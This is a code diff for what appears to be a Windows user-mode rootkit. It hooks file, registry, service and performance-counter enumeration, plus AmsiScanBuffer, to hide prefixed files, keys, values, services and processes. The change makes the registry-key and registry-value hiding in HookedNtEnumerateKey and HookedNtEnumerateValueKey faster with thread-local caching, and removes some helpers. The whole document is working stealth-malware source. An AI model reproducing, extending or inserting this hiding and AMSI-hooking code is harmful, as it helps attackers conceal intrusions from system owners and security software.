@@ -22,6 +22,15 @@ static NT_PDHGETRAWCOUNTERARRAYW OriginalPdhGetRawCounterArrayW;
 static NT_PDHGETFORMATTEDCOUNTERARRAYW OriginalPdhGetFormattedCounterArrayW;
 static NT_AMSISCANBUFFER OriginalAmsiScanBuffer;
 
+static DWORD TlsNtEnumerateKeyCacheKey;
+static DWORD TlsNtEnumerateKeyCacheIndex;
+static DWORD TlsNtEnumerateKeyCacheI;
+static DWORD TlsNtEnumerateKeyCacheCorrectedIndex;
+static DWORD TlsNtEnumerateValueKeyCacheKey;
+static DWORD TlsNtEnumerateValueKeyCacheIndex;
+static DWORD TlsNtEnumerateValueKeyCacheI;
+static DWORD TlsNtEnumerateValueKeyCacheCorrectedIndex;
+
 VOID InitializeHooks()
 {
 	DetourTransactionBegin();
@@ -46,6 +55,15 @@ VOID InitializeHooks()
 	// EnumServiceGroupW and EnumServicesStatusExW from advapi32.dll access services.exe through RPC.
 	// There is no longer one single syscall wrapper function to hook, but multiple higher level functions.
 	// EnumServicesStatusA and EnumServicesStatusExA also implement the RPC, but do not seem to be used by any applications out there.
+
+	TlsNtEnumerateKeyCacheKey = TlsAlloc();
+	TlsNtEnumerateKeyCacheIndex = TlsAlloc();
+	TlsNtEnumerateKeyCacheI = TlsAlloc();
+	TlsNtEnumerateKeyCacheCorrectedIndex = TlsAlloc();
+	TlsNtEnumerateValueKeyCacheKey = TlsAlloc();
+	TlsNtEnumerateValueKeyCacheIndex = TlsAlloc();
+	TlsNtEnumerateValueKeyCacheI = TlsAlloc();
+	TlsNtEnumerateValueKeyCacheCorrectedIndex = TlsAlloc();
 }
 VOID UninitializeHooks()
 {
@@ -65,6 +83,15 @@ VOID UninitializeHooks()
 	UninstallHook(OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
 	UninstallHook(OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
 	DetourTransactionCommit();
+
+	TlsFree(TlsNtEnumerateKeyCacheKey);
+	TlsFree(TlsNtEnumerateKeyCacheIndex);
+	TlsFree(TlsNtEnumerateKeyCacheI);
+	TlsFree(TlsNtEnumerateKeyCacheCorrectedIndex);
+	TlsFree(TlsNtEnumerateValueKeyCacheKey);
+	TlsFree(TlsNtEnumerateValueKeyCacheIndex);
+	TlsFree(TlsNtEnumerateValueKeyCacheI);
+	TlsFree(TlsNtEnumerateValueKeyCacheCorrectedIndex);
 }
 
 static VOID InstallHook(LPCSTR dll, LPCSTR function, LPVOID *originalFunction, LPVOID hookedFunction)
@@ -224,7 +251,6 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event
 		if (GetFileType(fileHandle) == FILE_TYPE_PIPE) StrCpyW(fileDirectoryPath, L"\\\\.\\pipe\\");
 		else GetPathFromHandle(fileHandle, fileDirectoryPath, MAX_PATH);
 
-		// github issue #104
 		if (returnSingleEntry)
 		{
 			// When returning a single entry, skip until the first item is found that is not hidden.
@@ -336,43 +362,94 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE eve
 }
 static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFORMATION_CLASS keyInformationClass, LPVOID keyInformation, ULONG keyInformationLength, PULONG resultLength)
 {
-	NTSTATUS status = OriginalNtEnumerateKey(key, index, keyInformationClass, keyInformation, keyInformationLength, resultLength);
-
-	// Implement hiding of registry keys by correcting the index in NtEnumerateKey.
-	if (status == ERROR_SUCCESS && (keyInformationClass == KeyBasicInformation || keyInformationClass == KeyNameInformation))
+	if (keyInformationClass == KeyNodeInformation)
 	{
-		for (ULONG i = 0, newIndex = 0; newIndex <= index && status == ERROR_SUCCESS; i++)
-		{
-			status = OriginalNtEnumerateKey(key, i, keyInformationClass, keyInformation, keyInformationLength, resultLength);
+		return OriginalNtEnumerateKey(key, index, keyInformationClass, keyInformation, keyInformationLength, resultLength);
+	}
 
-			if (!HasPrefix(KeyInformationGetName(keyInformation, keyInformationClass)))
-			{
-				newIndex++;
-			}
+	HANDLE cacheKey = (HANDLE)TlsGetValue(TlsNtEnumerateKeyCacheKey);
+	ULONG cacheIndex = (ULONG)TlsGetValue(TlsNtEnumerateKeyCacheIndex);
+	ULONG cacheI = (ULONG)TlsGetValue(TlsNtEnumerateKeyCacheI);
+	ULONG cacheCorrectedIndex = (ULONG)TlsGetValue(TlsNtEnumerateKeyCacheCorrectedIndex);
+
+	ULONG i = 0;
+	ULONG correctedIndex = 0;
+
+	if (cacheKey == key && cacheIndex == index - 1)
+	{
+		// This function was recently called the index - 1, so we can continue from the last known position.
+		// This increases performance from O(N^2) to O(N).
+		i = cacheI;
+		correctedIndex = cacheCorrectedIndex + 1;
+	}
+
+	BYTE buffer[1024];
+	PNT_KEY_BASIC_INFORMATION basicInformation = (PNT_KEY_BASIC_INFORMATION)buffer;
+
+	for (; i <= index; correctedIndex++)
+	{
+		if (OriginalNtEnumerateKey(key, correctedIndex, KeyBasicInformation, basicInformation, 1024, resultLength) != ERROR_SUCCESS)
+		{
+			return OriginalNtEnumerateKey(key, correctedIndex, keyInformationClass, keyInformation, keyInformationLength, resultLength);
+		}
+
+		if (!HasPrefix(basicInformation->Name))
+		{
+			i++;
 		}
 	}
 
-	return status;
+	correctedIndex--;
+
+	TlsSetValue(TlsNtEnumerateKeyCacheKey, key);
+	TlsSetValue(TlsNtEnumerateKeyCacheIndex, index);
+	TlsSetValue(TlsNtEnumerateKeyCacheI, i);
+	TlsSetValue(TlsNtEnumerateKeyCacheCorrectedIndex, correctedIndex);
+
+	return OriginalNtEnumerateKey(key, correctedIndex, keyInformationClass, keyInformation, keyInformationLength, resultLength);
 }
 static NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength)
 {
-	NTSTATUS status = OriginalNtEnumerateValueKey(key, index, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
+	HANDLE cacheKey = (HANDLE)TlsGetValue(TlsNtEnumerateValueKeyCacheKey);
+	ULONG cacheIndex = (ULONG)TlsGetValue(TlsNtEnumerateValueKeyCacheIndex);
+	ULONG cacheI = (ULONG)TlsGetValue(TlsNtEnumerateValueKeyCacheI);
+	ULONG cacheCorrectedIndex = (ULONG)TlsGetValue(TlsNtEnumerateValueKeyCacheCorrectedIndex);
 
-	// Implement hiding of registry values by correcting the index in NtEnumerateValueKey.
-	if (status == ERROR_SUCCESS && (keyValueInformationClass == KeyValueBasicInformation || keyValueInformationClass == KeyValueFullInformation))
+	ULONG i = 0;
+	ULONG correctedIndex = 0;
+
+	if (cacheKey == key && cacheIndex == index - 1)
 	{
-		for (ULONG i = 0, newIndex = 0; newIndex <= index && status == ERROR_SUCCESS; i++)
-		{
-			status = OriginalNtEnumerateValueKey(key, i, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
+		// This function was recently called the index - 1, so we can continue from the last known position.
+		// This increases performance from O(N^2) to O(N).
+		i = cacheI;
+		correctedIndex = cacheCorrectedIndex + 1;
+	}
 
-			if (!HasPrefix(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass)))
-			{
-				newIndex++;
-			}
+	BYTE buffer[1024];
+	PNT_KEY_VALUE_BASIC_INFORMATION basicInformation = (PNT_KEY_VALUE_BASIC_INFORMATION)buffer;
+
+	for (; i <= index; correctedIndex++)
+	{
+		if (OriginalNtEnumerateValueKey(key, correctedIndex, KeyValueBasicInformation, basicInformation, 1024, resultLength) != ERROR_SUCCESS)
+		{
+			return OriginalNtEnumerateValueKey(key, correctedIndex, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
+		}
+
+		if (!HasPrefix(basicInformation->Name))
+		{
+			i++;
 		}
 	}
 
-	return status;
+	correctedIndex--;
+
+	TlsSetValue(TlsNtEnumerateValueKeyCacheKey, key);
+	TlsSetValue(TlsNtEnumerateValueKeyCacheIndex, index);
+	TlsSetValue(TlsNtEnumerateValueKeyCacheI, i);
+	TlsSetValue(TlsNtEnumerateValueKeyCacheCorrectedIndex, correctedIndex);
+
+	return OriginalNtEnumerateValueKey(key, correctedIndex, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
 }
 static BOOL WINAPI HookedEnumServiceGroupW(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPVOID reserved)
 {
@@ -700,30 +777,6 @@ static VOID FileInformationSetNextEntryOffset(LPVOID fileInformation, FILE_INFOR
 			break;
 	}
 }
-static PWCHAR KeyInformationGetName(LPVOID keyInformation, NT_KEY_INFORMATION_CLASS keyInformationClass)
-{
-	switch (keyInformationClass)
-	{
-		case KeyBasicInformation:
-			return ((PNT_KEY_BASIC_INFORMATION)keyInformation)->Name;
-		case KeyNameInformation:
-			return ((PNT_KEY_NAME_INFORMATION)keyInformation)->Name;
-		default:
-			return NULL;
-	}
-}
-static PWCHAR KeyValueInformationGetName(LPVOID keyValueInformation, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass)
-{
-	switch (keyValueInformationClass)
-	{
-		case KeyValueBasicInformation:
-			return ((PNT_KEY_VALUE_BASIC_INFORMATION)keyValueInformation)->Name;
-		case KeyValueFullInformation:
-			return ((PNT_KEY_VALUE_FULL_INFORMATION)keyValueInformation)->Name;
-		default:
-			return NULL;
-	}
-}
 static VOID FilterEnumServiceStatus(LPENUM_SERVICE_STATUSW services, LPDWORD servicesReturned)
 {
 	for (DWORD i = 0; i < *servicesReturned; i++)
@@ -791,18 +844,16 @@ static DWORD GetProcessIdFromPdhString(LPCWSTR str)
 	// Parses a process ID from this type of string:
 	// "pid_1234_luid_0x00000000_0x0000C9DE_phys_0_eng_0_engtype_3D"
 
-	LPWSTR name = str;
-
-	if (!StrCmpNW(name, L"pid_", 4))
+	if (!StrCmpNW(str, L"pid_", 4))
 	{
-		name = &name[4];
-		PWSTR endIndex = StrStrW(name, L"_");
+		str = &str[4];
+		PWSTR endIndex = StrStrW(str, L"_");
 		if (endIndex)
 		{
 			WCHAR pidString[10];
 
-			DWORD strLength = endIndex - name;
-			i_wmemcpy(pidString, name, strLength);
+			DWORD strLength = endIndex - str;
+			i_wmemcpy(pidString, str, strLength);
 			pidString[strLength] = L'\0';
 
 			return StrToIntW(pidString);
